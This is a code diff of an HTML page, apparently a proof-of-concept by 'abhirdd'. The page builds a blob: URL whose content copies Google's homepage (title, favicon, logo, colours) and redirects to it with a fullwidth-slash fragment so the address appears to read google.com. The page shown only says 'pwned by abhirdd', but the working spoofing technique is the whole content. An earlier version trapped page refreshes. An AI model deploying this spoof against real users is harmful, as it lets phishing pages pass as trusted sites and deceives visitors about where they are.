@@ -2,49 +2,61 @@
 <html lang="id">
 <head>
 <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>google.com</title>
 </head>
 <body>
 
-<script>
-  (function () {
-    // 1. Dapatkan URL asli halaman ini (contoh: https://abhirdd.github.io/training/www.html)
-    var originalUrl = window.location.origin + window.location.pathname;
+  <script>
+    (function () {
+      // Fragment spoofing
+      var FRAGMENT = '#%EF%BC%8Fgoogle.com%EF%BC%8Fpwned-by-abhirdd';
 
-    // 2. Payload HTML untuk halaman Blob
-    var payload =
-      '<!DOCTYPE html><html><head><meta charset="utf-8">' +
-      '<title>google.com</title>' +
-      '<link rel="icon" href="https://www.google.com/favicon.ico">' +
-      '<script>' +
-        // LOGIKA ANDA DITERAPKAN DI SINI:
-        // Mencegat aksi refresh/keluar halaman
-        'window.addEventListener("beforeunload", function (e) {' +
-          // Alih-alih membiarkan browser mencari blob (yang menyebabkan error),
-          // kita paksa browser kembali ke URL asli.
-          'window.location.href = "' + originalUrl + '";' +
-        '});' +
-      '<\/script>' +
-      '</head>' +
-      '<body style="margin:0;height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;background:#fff;color:#000;font-family:Arial;">' +
-      
-      // Google Logo SVG
-      '<svg viewBox="0 0 48 48" style="width:100px; margin-bottom:20px;">' +
-      '<path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.7 17.74 9.5 24 9.5z"></path>' +
-      '<path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"></path>' +
-      '<path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"></path>' +
-      '<path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"></path>' +
-      '<path fill="none" d="M0 0h48v48H0z"></path>' +
-      '</svg>' +
-      
-      '<h1 style="font-weight:normal;font-size:3rem;">pwned by abhirdd</h1></body></html>';
+      // Payload HTML dengan warna dan font yang disesuaikan dengan Google
+      var payload =
+        '<!DOCTYPE html><html><head><meta charset="utf-8">' +
+        '<title>google.com</title>' +
+        '<link rel="icon" href="https://www.google.com/favicon.ico">' + 
+        '<style>' +
+          // CSS yang meniru halaman Google
+          'body { ' +
+            'margin: 0; ' +
+            'height: 100vh; ' +
+            'display: flex; ' +
+            'flex-direction: column; ' +
+            'align-items: center; ' +
+            'justify-content: center; ' +
+            'background-color: #FFFFFF; ' + // Warna putih murni Google
+            'color: #202124; ' + // Warna teks abu-abu gelap Google
+            'font-family: arial, sans-serif; ' +
+          '}' +
+          'h1 { ' +
+            'font-weight: normal; ' +
+            'font-size: 3rem; ' +
+            'margin-top: 20px; ' +
+          '}' +
+        '</style>' +
+        '</head>' +
+        '<body>' +
+        
+        // Google Logo SVG (Ukuran disesuaikan seperti halaman utama Google)
+        '<svg viewBox="0 0 48 48" style="width:120px; height:120px;">' +
+        '<path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.7 17.74 9.5 24 9.5z"></path>' +
+        '<path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"></path>' +
+        '<path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"></path>' +
+        '<path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"></path>' +
+        '<path fill="none" d="M0 0h48v48H0z"></path>' +
+        '</svg>' +
+        
+        '<h1>pwned by abhirdd</h1>' +
+        '</body></html>';
 
-    // 3. Generate Blob dan Redirect
-    var u = URL.createObjectURL(new Blob([payload], { type: 'text/html' }));
-    var FRAGMENT = '#%EF%BC%8Fgoogle.com%EF%BC%8Fpwned-by-abhirdd';
-    location.replace(u + FRAGMENT);
-  })();
-</script>
+      var u = URL.createObjectURL(new Blob([payload], { type: 'text/html' }));
+      
+      // Eksekusi redirect
+      location.replace(u + FRAGMENT);
+    })();
+  </script>
 
 </body>
 </html>
